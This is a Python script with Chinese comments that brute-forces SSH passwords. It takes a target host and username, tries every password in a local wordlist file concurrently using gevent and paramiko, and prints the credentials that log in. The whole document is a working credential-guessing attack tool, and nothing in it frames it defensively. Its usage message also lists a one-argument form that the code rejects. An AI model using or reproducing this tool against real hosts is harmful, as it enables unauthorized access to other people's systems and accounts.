#!/usr/bin/env python3

from gevent import monkey;monkey.patch_all()
import gevent
import paramiko

import sys

if len(sys.argv)-1 != 2:
    print("使用说明:")
    print(f"python {sys.argv[0]} <host> <user>")
    print(f"python {sys.argv[0]} <user>")
    print("    <host>: 扫描哪台主机，ip or 主机名")
    print("    <user>: 扫描那个用户")
    sys.exit(1)

host = sys.argv[1]
user = sys.argv[2]


def ssh(host, passwd):
    """
    指定账号密码，登录ssh
    :return: 
    """
    
    transport = paramiko.Transport((host, 22))
    transport.connect(username=user, password=passwd)
    
    ssh = paramiko.SSHClient()
    ssh._transport = transport
    
    stdin, stdout, stderr = ssh.exec_command('ls &> /dev/null')
    res=stdout.read()
    print(res.decode('utf-8'))
    
    transport.close()


def show_passwd(host, passwd):
    """
    处理ssh的登录异常
    :return: 
    """

    try:
        ssh(host, passwd)
        print(f"{host} {user} {passwd}")
        sys.exit(0)
    except Exception as e:
        pass


def gevent_passwd():
    """
    以只读的方式打开passwd文件，以协程的方式处理passwd文件中的每一行密码
    :return: 
    """

    with open("passwd", "r", encoding="utf-8") as f:
        passwd_g_l = []
        for line in f.readlines():
            passwd_g_l.append(gevent.spawn(show_passwd, host, line.strip()))
     
    gevent.joinall([*passwd_g_l])


def main():
    gevent_passwd()


if __name__ == '__main__':
    main()
